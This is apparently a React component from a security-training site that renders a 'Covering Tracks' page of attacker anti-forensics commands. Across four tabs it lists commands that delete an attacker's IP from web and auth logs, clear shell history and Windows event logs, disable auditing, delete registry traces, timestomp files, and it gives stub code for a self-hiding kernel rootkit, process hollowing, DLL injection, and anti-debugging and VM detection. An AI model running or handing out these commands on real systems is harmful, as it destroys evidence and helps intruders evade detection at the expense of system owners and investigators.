
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { EyeOff, Trash2, Shield, AlertTriangle } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const CoveringTracks: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <EyeOff className="h-6 w-6" />
          Covering Tracks
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="log-manipulation" className="w-full">
          <TabsList className="grid grid-cols-4 w-full">
            <TabsTrigger value="log-manipulation">Log Manipulation</TabsTrigger>
            <TabsTrigger value="file-cleanup">File Cleanup</TabsTrigger>
            <TabsTrigger value="process-hiding">Process Hiding</TabsTrigger>
            <TabsTrigger value="anti-forensics">Anti-Forensics</TabsTrigger>
          </TabsList>

          <TabsContent value="log-manipulation" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Log Manipulation & Evasion</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Web Server Log Cleaning</h4>
              <CodeExample
                language="bash"
                title="Apache/Nginx Log Manipulation"
                code={`# Clear specific entries from Apache access log
ATTACKER_IP="192.168.1.100"
sed -i "/$ATTACKER_IP/d" /var/log/apache2/access.log
sed -i "/$ATTACKER_IP/d" /var/log/apache2/error.log

# Clear specific entries from Nginx logs
sed -i "/$ATTACKER_IP/d" /var/log/nginx/access.log
sed -i "/$ATTACKER_IP/d" /var/log/nginx/error.log

# Clear specific attack patterns
sed -i '/shell\.php/d' /var/log/apache2/access.log
sed -i '/\.\.\/\.\.\//d' /var/log/apache2/access.log
sed -i '/union.*select/Id' /var/log/apache2/access.log

# Truncate logs completely
> /var/log/apache2/access.log
> /var/log/apache2/error.log

# Log rotation to hide evidence
logrotate -f /etc/logrotate.conf
mv /var/log/apache2/access.log.1 /tmp/hidden_log

# Disable logging temporarily
service rsyslog stop
service apache2 stop
# Modify apache2.conf to disable logging
# CustomLog /dev/null combined
service apache2 start`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">System Log Manipulation</h4>
              <CodeExample
                language="bash"
                title="Linux System Log Cleaning"
                code={`# Clear specific entries from system logs
ATTACKER_IP="192.168.1.100"
sed -i "/$ATTACKER_IP/d" /var/log/auth.log
sed -i "/$ATTACKER_IP/d" /var/log/secure
sed -i "/$ATTACKER_IP/d" /var/log/messages
sed -i "/$ATTACKER_IP/d" /var/log/syslog

# Clear SSH login logs
sed -i '/sshd.*Accepted/d' /var/log/auth.log
sed -i '/sshd.*session opened/d' /var/log/auth.log

# Clear sudo logs
sed -i '/sudo.*COMMAND/d' /var/log/auth.log

# Clear kernel logs
dmesg -c > /dev/null

# Clear command history
history -c
history -w
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Clear last login records
> /var/log/lastlog
> /var/log/wtmp
> /var/log/btmp

# Clear user login history
> ~/.bash_history
> ~/.zsh_history
> ~/.python_history`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Windows Event Log Manipulation</h4>
              <CodeExample
                language="powershell"
                title="Windows Event Log Clearing"
                code={`# Clear specific Windows event logs
wevtutil cl Security
wevtutil cl System  
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear specific event IDs
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Clear-WinEvent

# PowerShell log manipulation
Remove-Item -Path "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" -Force
New-Item -Path "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" -ItemType File

# Disable logging temporarily
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Account Logon" /success:disable /failure:disable

# Clear IIS logs
Remove-Item -Path "C:\inetpub\logs\LogFiles\W3SVC1\*.log" -Force

# Clear Windows Defender logs
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Support\*.log" -Force`}
              />
            </div>
          </TabsContent>

          <TabsContent value="file-cleanup" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">File & Artifact Cleanup</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Temporary File Cleanup</h4>
              <CodeExample
                language="bash"
                title="Comprehensive File Cleanup"
                code={`#!/bin/bash
# Comprehensive cleanup script

# Remove temporary files
rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf ~/.cache/*

# Remove shell history files
rm -f ~/.bash_history
rm -f ~/.zsh_history
rm -f ~/.python_history
rm -f ~/.mysql_history

# Remove recently accessed files
rm -f ~/.recently-used*
rm -f ~/.local/share/recently-used.xbel

# Remove thumbnail cache
rm -rf ~/.thumbnails/*
rm -rf ~/.cache/thumbnails/*

# Remove system temp directories
find /tmp -type f -name "*.tmp" -delete
find /var/tmp -type f -name "*.tmp" -delete

# Remove core dumps
find / -name "core" -type f -delete 2>/dev/null

# Remove backup files
find / -name "*~" -type f -delete 2>/dev/null
find / -name "*.bak" -type f -delete 2>/dev/null

# Remove uploaded web shells
find /var/www -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \; | head -20 | xargs rm -f

# Secure deletion (overwrite)
shred -vfz -n 10 /path/to/sensitive/file
dd if=/dev/urandom of=/path/to/sensitive/file bs=1M count=file_size
rm /path/to/sensitive/file`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Registry Cleanup (Windows)</h4>
              <CodeExample
                language="batch"
                title="Windows Registry Cleanup"
                code={`REM Clear Run/RunOnce entries
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f

REM Clear recent documents
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f

REM Clear typed URLs
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs" /f

REM Clear network connections
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU" /f

REM Clear Windows Search history
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" /f

REM Clear PowerShell history
Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force

REM Clear Windows event logs registry
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security" /f

REM Clear prefetch files
del /f /q C:\Windows\Prefetch\*.pf`}
              />
            </div>
          </TabsContent>

          <TabsContent value="process-hiding" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Process & Service Hiding</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Rootkit Techniques</h4>
              <CodeExample
                language="c"
                title="Linux Kernel Module Rootkit"
                code={`#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

// Hide process from ps command
static struct list_head *prev_module;

static int __init rootkit_init(void) {
    // Hide this module from lsmod
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    
    // Hook system calls to hide processes
    // Implementation details omitted for brevity
    
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore module visibility
    list_add(&THIS_MODULE->list, prev_module);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Process Hiding Rootkit");`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Windows Process Hiding</h4>
              <CodeExample
                language="powershell"
                title="Windows Process Hiding Techniques"
                code={`# Process hollowing
$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ProcessHollowing {
    [DllImport("ntdll.dll")]
    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
    
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    // Implementation details...
}
"@

Add-Type -TypeDefinition $code

# DLL injection
$code2 = @"
using System;
using System.Runtime.InteropServices;

public class DLLInjection {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
}
"@

Add-Type -TypeDefinition $code2

# Hide service
sc.exe config "ServiceName" start= disabled
sc.exe stop "ServiceName"
sc.exe delete "ServiceName"`}
              />
            </div>
          </TabsContent>

          <TabsContent value="anti-forensics" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Anti-Forensics Techniques</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Timestamp Manipulation</h4>
              <CodeExample
                language="bash"
                title="File Timestamp Manipulation"
                code={`# Touch command to modify timestamps
touch -d "2023-01-01 12:00:00" /path/to/file

# Copy timestamps from legitimate file
touch -r /bin/ls /path/to/malicious/file

# Modify access time
touch -a -d "2023-01-01 12:00:00" /path/to/file

# Modify modification time
touch -m -d "2023-01-01 12:00:00" /path/to/file

# Timestomp (Windows - Metasploit)
timestomp -z "01/01/2023 12:00:00" C:\path\to\file

# PowerShell timestamp modification
$file = Get-Item "C:\path\to\file"
$file.LastWriteTime = "01/01/2023 12:00:00"
$file.LastAccessTime = "01/01/2023 12:00:00"
$file.CreationTime = "01/01/2023 12:00:00"

# Batch modify multiple files
find /var/www -name "*.php" -exec touch -d "2023-01-01 12:00:00" {} \;

# System clock manipulation
timedatectl set-time "2023-01-01 12:00:00"
date -s "01/01/2023 12:00:00"`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Memory Forensics Evasion</h4>
              <CodeExample
                language="python"
                title="Memory Evasion Techniques"
                code={`import ctypes
import os
import sys

def clear_memory():
    """Clear sensitive data from memory"""
    # Force garbage collection
    import gc
    gc.collect()
    
    # Overwrite variables
    sensitive_data = "A" * 1000  # Overwrite with dummy data
    
    # Clear Python's internal structures
    sys.modules.clear()

def anti_debug():
    """Anti-debugging techniques"""
    # Check for debugger
    if ctypes.windll.kernel32.IsDebuggerPresent():
        os._exit(1)
    
    # Check for virtual machine
    try:
        import wmi
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            if "VMware" in item.Model or "VirtualBox" in item.Model:
                os._exit(1)
    except:
        pass

def obfuscate_strings():
    """String obfuscation to avoid detection"""
    # Base64 encoding
    import base64
    command = base64.b64encode(b"malicious_command").decode()
    
    # XOR encoding
    def xor_encode(data, key):
        return ''.join(chr(ord(char) ^ key) for char in data)
    
    encoded_cmd = xor_encode("malicious_command", 0x42)
    
    # ROT13 encoding
    def rot13(text):
        return ''.join(chr((ord(char) - 97 + 13) % 26 + 97) if 'a' <= char <= 'z' 
                      else chr((ord(char) - 65 + 13) % 26 + 65) if 'A' <= char <= 'Z' 
                      else char for char in text)
    
    rot13_cmd = rot13("malicious_command")

# Memory wiping for C programs
def secure_memset(ptr, size):
    """Secure memory wiping in C"""
    c_code = """
    #include <string.h>
    void secure_memset(void *ptr, size_t size) {
        volatile unsigned char *p = ptr;
        while (size--) {
            *p++ = 0;
        }
    }
    """
    return c_code`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default CoveringTracks;
